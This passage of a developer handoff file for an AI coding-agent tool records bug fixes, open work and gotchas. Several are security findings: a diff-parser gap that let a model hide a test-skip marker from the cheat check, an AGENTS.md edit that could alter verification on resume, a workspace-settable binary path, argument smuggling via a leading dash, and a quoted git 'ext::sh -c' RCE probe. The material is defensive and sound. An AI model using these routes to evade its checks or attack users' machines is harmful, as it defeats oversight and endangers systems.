   no-paren regex alternative, a whitespace-tolerant self-equality
   pattern, comment-stripping before the threshold check, and a
   `baseStem`-based subject-relatedness check for the snapshot exemption.
5. **Diff-parser content-loss bug** (`diff-parser.ts`) — the file-header
   skip (`line.startsWith("+++") || line.startsWith("---")`) matched any
   line with that prefix, not just the genuine `+++ b/path`/`--- a/path`
   header lines — an added line whose real content starts with `++`
   (renders `+++x; ...`) or a removed line starting with `--` was
   silently dropped before any cheat check ever saw it, letting e.g. a
   skip-marker addition hide inside a line shaped that way. Fixed by
   tracking whether a hunk (`@@ ... @@`) has been seen yet per file —
   header lines only ever appear before the first hunk.
6. **`classifyFailure` lint/typecheck `ENV_ERROR_RE` gap** — `build`/`test`
   both check `ENV_ERROR_RE` before trusting their own stage name (an
   environment failure — `ECONNREFUSED`, disk-full — isn't a task the
   model can fix by editing code); `lint`/`typecheck` skipped that check
   entirely, exactly the misclassification the surrounding comment warns
   against for the other two stages. Fixed by mirroring the check.
7. **Loop-detector key-order blind spot** (`agent-loop.ts` →
   `loop-detector.ts`) — `recordToolCall` was wired with the raw
   `argsJson` *string*, not the parsed object, so `stableStringify`'s
   whole documented purpose (canonicalize by sorted key order, so two
   calls with the same semantic args but differently-ordered JSON hash
   identically) never actually ran — it short-circuits to
   `JSON.stringify` on a non-object. Fixed by parsing `argsJson` before
   handing it to the detector, falling back to the raw string only on a
   parse failure.
8. **Provider stream-failure masking** (`openai-compatible.ts` +
   `anthropic.ts`) — three sub-bugs each, same root cause: a stream that
   ends (connection drop, in-band `{error:...}`/`event: error` with no
   `choices`/prior `stop_reason`) without ever producing a chunk the loop
   recognizes as terminal used to fall through silently, and `collect()`
   defaults `finishReason` to `"stop"` — a truncated or failed turn was
   reported as a normal, complete one. Also: OpenAI's `content_filter`
   and Anthropic's `refusal` finish/stop reasons fell through to `default`
   → `"stop"` instead of `"error"`; Anthropic's in-stream `error` event
   was hardcoded `retryable: false` regardless of the error's actual
   type (`overloaded_error` is Anthropic's own documented transient
   condition, same tier as an HTTP 529). Fixed with a `sawTerminal` flag
   yielding an explicit error if the stream ends without one, explicit
   `content_filter`/`refusal` → `"error"` mappings, and a
   `RETRYABLE_ANTHROPIC_ERROR_TYPES` set driving `retryable` from the
   error's real type.
9. **CLI `NaN` budget bypass** — `(v) => parseInt(v, 10)`/`parseFloat`
   silently produce `NaN` for a typo'd flag value, and the only check
   downstream is `!== undefined` (true for `NaN`) — reproduced for real:
   `clutchcode run ... --max-steps five` genuinely ran with the step
   budget silently set to `NaN` (visible verbatim in the CLI's own status
   output as `steps: 1/NaN`), since every `>=` comparison against `NaN`
   is `false`. Fixed with `parseIntArg`/`parseFloatArg` wrappers that
   throw `InvalidArgumentError` on `NaN`, giving a clean CLI rejection.
10. **CLI `--squash` always-on** — a plain `--squash` boolean defaulting
    to `true` had no `--no-squash` counterpart, so `ApproveOptions.squash
    === false` (a real, different `git merge --no-ff` code path in
    `approveRun`, preserving full checkpoint history) could never
    actually be reached from the CLI — reproduced: `--no-squash` errored
    "unknown option." Fixed by registering `--no-squash` instead (commander
    auto-negates the same underlying boolean).
11. **VS Code `cliPath` workspace-setting hijack** — `clutchcode.cliPath`
    had no `scope` declared (defaulting to `window`, settable from a
    workspace's own `.vscode/settings.json`), so any repo could redirect
    which binary the extension spawns with no prompt. Fixed by declaring
    `"scope": "machine"` — can only be set in User/Remote settings per
    VS Code's own documented contract. **Caveat, stated plainly:** no
    real VS Code extension host exists in this environment, so this can't
    be exercised end-to-end; the new test only proves the schema
    declaration itself is present and hasn't regressed.
12. **Credential-file-store silent data loss** — `fileStoreSet`/
    `fileStoreClear` treated any decrypt/parse failure of an *existing*
    `credentials.age` (rotated machine key, corrupted/truncated file)
    identically to "nothing stored yet," then silently overwrote the
    file with just the one account being touched — reproduced by
    corrupting a two-account store and confirming the corrupted bytes
    used to get clobbered by a fresh single-account envelope. Fixed by
    threading through an `existedButUndecryptable` flag from a new
    `readStoreDetailed` and refusing to write when it's set — `fileStoreGet`'s
    documented always-silent read contract is untouched.
13. **Truncate.ts positional-dedup bug** — `extraFailures` deduped shown
    vs. omitted failure lines by *text*, not position, so a repeated
    error string (very typical in a real CI log) appearing once in the
    shown head and again, genuinely distinctly, deep in the omitted
    middle made the omitted occurrence invisible. Fixed by tracking shown
    line *indices* instead of a text `Set`.
14. **Test-selection basename-only matching** — `selectImpactedTests`
    matched a changed file to a test file by basename alone, no
    directory relationship check, so an unrelated same-named test file
    anywhere else in the repo satisfied "this file was mapped" and
    suppressed the full-suite fallback while the real (different-
    basename) test never ran. Fixed with a `relatedDirs` check (same
    directory, a conventional test subdirectory, or a top-level `src/`+
    `test/`-style sibling split) — deliberately conservative so two
    same-parent module directories with unrelated names don't count.

608 → 653 tests (45 new), clean `tsc -b`, clean `eslint .`. One review
agent (sandbox/policy/redaction/tier1) did not complete — hit a session
API limit — and is genuinely unreviewed this round, not silently skipped.

### Autonomous-continuation convention ("start work" / "refer the handoff and work")

Not a code change — a process convention, requested directly: two trigger
phrases that let a session pick up this project's own continuation loop
without needing the exact task re-explained each time.

- **"start work"** spawns a background `general-purpose` subagent that
  reads `CLAUDE.md` + `HANDOFF.md`, picks the next unit of work, does it
  end to end (tests, the verify-before-fix discipline, build/test/lint,
  HANDOFF.md update, commit/push), and reports back — the orchestrating
  session relays that report to the user rather than fabricating one.
- **"refer the handoff and work"** (typically the first message of a
  fresh session) skips the subagent — the session itself reads
  `HANDOFF.md` + `CLAUDE.md` and starts the same work directly, no
  clarifying questions.

Implemented as two project skills (`.claude/skills/start-work/SKILL.md`,
`.claude/skills/refer-handoff/SKILL.md`) that pattern-match the trigger
phrases and point back at a new `CLAUDE.md` section, "Autonomous
continuation," which is the actual source of truth: it defines the shared
priority order for "what's the next unit of work" (an explicitly deferred
item from this file's latest "what's done" entry first, then the top row
of "What's left" below, then another audit round per the most recent
review round's methodology if neither exists) so both trigger phrases stay
in lockstep with each other and can't drift apart. Kept the actual
playbook in one place (`CLAUDE.md`) rather than duplicated across both
skill files, for the same "one shared thing, not two that can drift"
reason as this session's `assertSafeRunId` fix.

---

## What's left

Roughly ordered by what a next session would naturally reach for first.
Effort is rough — a single focused session's worth of work, at this
project's standard (real tests, honest verification flags), not a
loose "MVP" estimate.

| Item | Spec ref | Rough effort | Notes |
|---|---|---|---|
| Windows sandbox Tier 1 | §12.5/§12.6, A11 | medium | WSL2-recommended is the spec's own documented fallback; a native restricted-token/AppContainer path is explicitly `[C:Low]` in the spec — confirm whether it's worth building vs. staying doc-only. |
| Landlock | §12.6 | medium–large, needs a plan first | Seccomp is done (see "what's done"); Landlock specifically needs either a native helper binary or a vetted raw-syscall binding — neither exists yet, and a hand-rolled one carries a worse failure mode (silently over-permissive, not fail-loud) than seccomp did. Don't attempt without a clear verification story first. |
| arm64 seccomp | §12.6 | small, needs an arm64 host | The x86_64 filter is done and verified; arm64 has a different syscall number table with no way to verify it in this (x86_64) environment — needs either an arm64 host/CI runner or a very high-confidence authoritative source cross-checked the same way libseccomp's resolver was used for x86_64. |
| VS Code multi-file "changes" view | §18.5, minor | small | The extension opens one real `vscode.diff` editor per changed file (done, see "what's done") rather than combining several into VS Code's newer `vscode.changes` command — deliberately skipped since that command isn't universally available across the `^1.85.0` engine range this extension targets. Revisit if the minimum supported VS Code version is ever raised. |
| Full non-git `AgentLoop` execution path | — | large, separate project | Snapshot-backed (not worktree-backed) execution for non-git directories. `Agent.run` currently refuses cleanly with a "run git init" error instead of attempting this. |
| `agent workflow` CLI command | §8.1/§18.2, Phase 2 | small | Both authoring layers exist now (built-ins + `--workflow-file`, see "what's done") — what's missing is the dedicated list/select/validate command §18.2 itself marks Phase 2. `--workflow-file <path>` can validate-and-run today; there's no `agent workflow validate <path>` that checks a file without starting a run, and no `agent workflow list` enumerating built-ins + any locally-referenced custom ones. |
| PageRank repo map | §9, Phase 7 | medium | Tier 0 (ripgrep + on-demand tree-sitter) is what's live; the Aider-style PageRank map is Tier 1, triggered by measured retrieval-accuracy failures on large repos, not built preemptively. |
| Eval scoreboard | §16, Phase 8 | medium–large | The replay harness (§16.3c) is live and gates every phase; the full SWE-bench-Verified-subset + Terminal-Bench-style scoreboard with published methodology is not. |
| Multi-agent orchestration | §7, Phase 9 | large | Explicitly out of scope until the §7 rule justifies it — the spec argues *against* building this by default. Don't start it without re-reading §7's reasoning first. |
| Sandbox/policy/redaction security audit | §12/§5.2 | small–medium, do first | The round-3 review's 9th subagent (`packages/sandbox/src/policy.ts`, `denylist.ts`, `destructive.ts`, `env.ts`, `redactor.ts`, `tier1-linux.ts`, `tier1-macos.ts`, plus `seccomp-linux.ts` beyond the already-fixed temp-path issue) hit a session API limit mid-run and never completed. Genuinely unreviewed, not silently skipped — this is one of the highest-value places to point the next review round, since it's the OS-confinement + secret-redaction layer. |
| Git worktree/dirty-tree correctness findings (round 3, confirmed real, not yet fixed) | §13.1/§13.3 | small each | Five confirmed-real correctness bugs from the round-3 git-package audit, deferred for scope: (1) `checkpoint()`'s `git status --porcelain` call uses `allowFailure: true` right after `add -A`, so a real git error (index lock, disk error) is swallowed and misread as "nothing changed," silently skipping a checkpoint that should have been created — fix by not using `allowFailure` there. (2) `approveRun`/`discardRun` call `restoreStash` with no error handling *after* the merge/discard already succeeded — a stash-pop conflict then throws an exception for an operation that actually completed, potentially leaving literal conflict markers in the just-merged tree. (3) `dirty-tree.ts` identifies the auto-stash by the positional ref `stash@{0}`, captured once at push time and reused verbatim at restore time — if any other `git stash` happens on the repo in between (a plausible manual stash by the user during a long-running agent run), `restoreStash` pops the wrong entry. Fix by capturing `git rev-parse stash@{0}` (a stable SHA) at push time and resolving it back to its current position at restore time. (4) Neither dirty-tree strategy preserves the original staged/unstaged split (`stash pop` without `--index`; temp-commit's `add -A` stages everything) despite a code comment claiming the tree is "left exactly as it was" — fix with `stash pop --index` and a staged-set-preserving temp-commit path. (5) `createRunWorktree` runs `handleDirtyTree` (destructive: stashes/temp-commits) before the still-fallible `git worktree add` — a failure there (branch collision, disk error) leaves an orphaned stash with no automatic recovery path, since the `RunWorktree` object that would carry `dirtyTreeResult.stashRef` back to the caller is never constructed. Fix by wrapping the post-stash steps in try/catch and surfacing/restoring the stash on failure. |
| `snapshot-backup.ts` `relPath` traversal (round 3, confirmed real, currently unreachable) | §13.4 | small | `snapshotBeforeFirstEdit`/`rollback` join a caller-supplied `relPath` into `workspaceRoot`/`backupDir` with no traversal guard — the same class of bug fixed for `runId` elsewhere. Currently dead code (`agent.ts`'s `run()` throws before ever constructing a `SnapshotBackup` — the non-git execution path isn't wired up yet, see the "Full non-git AgentLoop execution path" row above), but it's an exported public API with no traversal test coverage, and the code comments explicitly plan to wire it up later. Fix with the same `assertSafeRunId`-style pattern before that wiring happens, not after. |

## Known gotchas (read before you hit them again)

- **`import Ajv from "ajv"` type-errors under this repo's `moduleResolution:
  NodeNext`** ("This expression is not constructable" / a `ValidateFunction
  | undefined` not assignable error on `.compile()`'s result). ajv ships a
  single ambiguous `.d.ts` (no separate `.d.cts`/`.d.mts`), and TS's
  NodeNext default-export interop for that shape resolves to the whole
  module namespace, not the class. Fix: `import { Ajv } from "ajv"` — ajv
  also exports the class by name, which sidesteps the broken path
  entirely. Runtime behavior was never actually broken (Node's own CJS
  interop handles the real `.js` file fine) — this is purely a
  compile-time TS quirk, confirmed by testing both import styles against
  the exact same compiled output.
- **`git diff <commit>` (no `--cached`) never reports an untracked path,
  no matter what it's diffed against.** A file the model just wrote that
  was never `git add`ed is invisible to it — not "shown as added," just
  absent. `diffFilesAgainstBase` (§18.5) hit this: fixed by staging first
  (`git add -A`), same as `checkpoint()` already does per step. If a
  diff-based function mysteriously misses a brand-new file, check whether
  it's staged.
- **`git diff --numstat -M` combines a rename's two paths into one
  string** — `"old => new"`, or `"dir/{old => new}"` when they share a
  directory — instead of two separate columns. Any code that tries to
  match a bulk `--numstat` query's output back against individually-
  parsed old/new paths from `--name-status` will never match a rename.
  `diffFilesAgainstBase`'s binary detection hit exactly this (caught in
  code review, see "what's done"): fixed by scoping the numstat query to
  one explicit pathspec per file instead of one bulk query — confirmed
  empirically that scoping to a single path suppresses the combining.
- **`git stash push --include-untracked` silently hides new files.**
  `handleDirtyTree`'s default "stash" strategy will stash an uncommitted
  config change (e.g. a test's `saveConfig()` call) before a run starts,
  so `buildRunDeps`'s `loadConfig` reads the stale default instead of
  what you just wrote. If a test's config change isn't taking effect,
  check whether it was committed before calling `agent.run()`.
- **The Redactor's generic high-entropy pattern (`§5.2`) false-positives
  on innocuous 32+-char uppercase/underscore test strings.** If a
  "leaked content" assertion in a test mysteriously fails even though the
  underlying behavior looks right, check whether your marker string got
  swapped for `«REDACTED:generic»`. Use a lowercase, space-separated
  marker instead.
- **ASK vs. DENY policy decisions**: `write_file`/`edit_file` used to
  collapse every non-ALLOW decision to `"policy-denied"` — harmless while
  WRITE was always ALLOW/DENY, until the submodule gate introduced the
  first WRITE `ASK` case and silently mismapped it. Fixed, but the lesson
  generalizes: when adding a new `ASK` case to an existing policy check,
  verify the caller actually branches on `ASK` vs `DENY`, don't assume it
  does because it handles `DENY`.
- **`pgrep -f '--flag=value'` treats the pattern as a pgrep option.**
  Needs `pgrep -f -- 'flag=value'` (the `--` stops pgrep's own option
  parsing). Bit the throwaway-Secret-Service test helper once.
- **`execFileSync`'s stderr leaks to the parent process by default.**
  Any wrapper around a CLI tool that's *expected* to fail routinely (a
  keychain lookup with nothing stored, no session bus, etc.) needs
  `stdio: ["ignore"|"pipe", "pipe", "ignore"]` explicitly, or its stderr
  text shows up uninvited in every test run and every real agent run.
- **`detectKeychainBackend` reports a backend based on PATH alone, not
  actual reachability.** On this dev container `secret-tool` is always on
  PATH, so the backend is always `"secret-service"` even with no D-Bus
  session running — it just fails at the `keychainGet`/`Set`/`Clear` call
  a layer down. To actually exercise the tier-2 file-store fallback (or
  test "no keychain at all" behavior), you have to force backend `"none"`
  by passing an `env` with a `PATH` that genuinely has no `secret-tool` on
  it — removing `DBUS_SESSION_BUS_ADDRESS` alone isn't enough, it only
  gets you "keychain present but unreachable," a different code path.
- **A raw child-process fd (`bwrap --seccomp FD`) is wired via Node's
  `spawn(..., { stdio: [...] })` array, not any special child_process
  API.** `fs.openSync()` the file, put the resulting fd number at the
  array index matching the fd number you want in the child (index 3 →
  fd 3), and reference that same number in argv (`--seccomp 3`). The
  parent's copy of the fd can be closed immediately after `spawn()`
  returns — the fork+exec already happened synchronously by then, so the
  child has its own independent copy; no need to keep it open for the
  child's whole lifetime.
- **When recalling syscall numbers or any other kernel ABI constant for a
  security-critical filter, don't rely on memory alone if a real
  authoritative source is available.** `libseccomp`'s own resolver
  (`python3 -c "import seccomp; print(seccomp.resolve_syscall(seccomp.Arch(), name))"`,
  needs `apt-get install python3-seccomp` — note it installs against a
  *specific* Python minor version, check `dpkg -L python3-seccomp` if
  `import seccomp` fails on whichever `python3` is first on PATH) settled
  every number in `seccomp-linux.ts` before it got hardcoded, rather than
  trusting recall. Where no authoritative local source exists (arm64,
  here), the honest move is to say so and not implement that path at all
  — see the arm64-seccomp row in "what's left."
- **A cache keyed on a per-run ephemeral path never hits — this bit the
  first pass of `@clutchcode/memory` for real.** `getOrDetectToolchain`
  originally took one `repoRoot` param used for both reading manifest
  files *and* the cache filename; `agent-api` passed it the run's git
  worktree path, which is a fresh temp directory every single run. The
  cache write always "succeeded" and the read logic was all correct in
  isolation — it just never hit anything, because no two runs ever share
  a worktree path. Two `agent.test.ts` assertions caught it immediately
  (`listMemory` came back `undefined`; a "verification is the truth
  oracle" test that expected the run to escalate on a corrupted command
  instead came back `DONE`, because the correction had been written under
  a path nothing would ever read from again). The fix: split the
  parameter into `detectFrom` (the live worktree — what's actually being
  verified) and `cacheKeyPath` (the stable repo+scope identity). Lesson:
  when a cache/memory layer sits underneath something that creates a
  fresh directory per invocation (worktrees, temp dirs, per-run scratch
  space), double-check which path is actually being used as the cache
  *key* versus the *content source* — they're very easy to conflate when
  one function reads from disk and persists to disk in the same call.
- **`git`'s real default for `protocol.ext.allow` is `never`, not the
  general `user` default.** Most unlisted/user-defined protocols default
  to allowed-when-explicitly-invoked (`user`), but `ext::<command>` (and a
  couple of other known-dangerous transports) are special-cased to
  `never` by git itself — confirmed by actually running `git push -u
  "ext::sh -c '...'" main` against a real throwaway repo and getting
  `fatal: transport 'ext' not allowed`, not by trusting a subagent's
  claim. Don't assume a "closes an RCE" security finding about `ext::` is
  accurately scoped without checking git's actual compiled-in default for
  that specific protocol — it's a real risk only on a host where an admin
  has explicitly re-enabled it.
- **A single leading `-` prepended to an LLM/caller-controlled CLI arg
  can become a double-dash long option if the arg itself also starts with
  `-`.** `` `-${arg}` `` with `arg = "output=/tmp/x"` produces `-output=…`
  (harmless — git doesn't recognize single-dash long options), but `arg =
  "-output=/tmp/x"` produces `--output=/tmp/x`, a real long option. Bit
  the `git log` tool's `arg` → `-${arg}` count-shorthand construction for
  real (§ "Full-history security review" in "what's done"). Any code that
  prepends a single fixed dash to a value it doesn't fully control needs
  to validate the value's *shape* (e.g. "must be a bare digit string"),
  not just its absence of malice — a value that's merely "not obviously
  a flag" can still smuggle one in via its own leading dash.
- **`getOrDetectToolchain`'s cache means an AGENTS.md-content change alone
  is invisible to it mid-run — you need a manifest-file change too.**
  `computeManifestHash` only hashes `MANIFEST_FILES` (`package.json`,
  lockfiles, etc.), not `AGENTS.md` itself, so writing a new `AGENTS.md`
  with nothing else changed leaves the cached record's hash matching and
  the cache hit returns the *old* (pre-edit) derived commands unchanged —
  the AGENTS.md override never gets re-applied. This bit reproducing the
  round-3 AGENTS.md trust-boundary exploit directly: a first test version
  that only wrote `AGENTS.md` passed even against the pre-fix code, for
  the wrong reason (cache hit, not the fix). The real trigger needs a
  manifest-file touch alongside the AGENTS.md edit (a `package.json`
  field bump is enough) to force `getOrDetectToolchain` to actually
  re-derive. If a fix "doesn't seem to do anything" in a toolchain-memory-
  adjacent test, check whether the scenario ever invalidates the cache at
  all.
- **A resumed run's `buildRunDeps` runs a second time; a plain `run()`'s
  doesn't, mid-loop.** `toolchainCommands` (and everything else
  `buildRunDeps` derives) is computed once at the top of `run()` and
  reused unchanged for every repair iteration within that same call — a
  model editing something `buildRunDeps` reads (AGENTS.md, config) mid-run
  has no effect on that run's own remaining verification. `resume()` is a
  *separate* top-level call that re-invokes `buildRunDeps` against
  whatever the worktree now contains. Any exploit/bug hypothesis of the
  shape "the model edits X mid-run, does that affect verification this
  run?" needs tracing against this fact before assuming the answer is
  yes — the round-3 AGENTS.md finding's real reachability is specifically
  through `resume()`, not a single uninterrupted `run()` call, despite
  reading at first like the latter.
- **Commander's `.option("--no-<x>", ...)` registered *alone* (no separate
  plain `--<x>` registration) auto-creates a boolean option named `<x>`
  defaulting to `true`.** This is the correct, minimal way to add a
  `--no-squash` counterpart to an existing `--squash`-flavored default:
  replace the old `.option("--squash", ..., true)` registration entirely
  with `.option("--no-squash", ...)` — don't register both, commander
  treats them as the same underlying boolean either way and registering
  both is redundant at best, contradictory at worst.
- **A VS Code `contributes.configuration` property with no explicit
  `"scope"` defaults to `window`-scoped — settable from a workspace's own
  `.vscode/settings.json`.** Any setting whose value gets used as a path,
  command, or URL to execute/fetch needs `"scope": "machine"` (or
  `"application"`) explicitly, or any repo the user opens can silently
  redirect it. No real VS Code extension host exists in this environment
  to prove enforcement end-to-end — the fix (and its test) can only prove
  the schema declaration is correct, not that VS Code honors it; that's
  an honest, stated limit, not a gap to paper over.

## How to resume

1. Read this file, then skim `README.md`'s Status section for anything
   that's landed since this snapshot.
2. `pnpm install && pnpm build && pnpm test` — confirm the baseline is
   still green before changing anything.
3. Pick an item from "What's left" above, or ask the user which they'd
   rather prioritize if it's not obvious from context.
4. Follow `CLAUDE.md`'s testing philosophy: real over mocked wherever
   real is achievable in this environment; when it genuinely isn't
   (another OS, another host), split pure-buildable logic from the
   unverifiable execution boundary and flag the gap explicitly — in a
   header comment and in `README.md`.
5. Full build/test/lint loop before every commit. Update this file's
   "What's done"/"What's left" tables and the snapshot header before
   you stop.
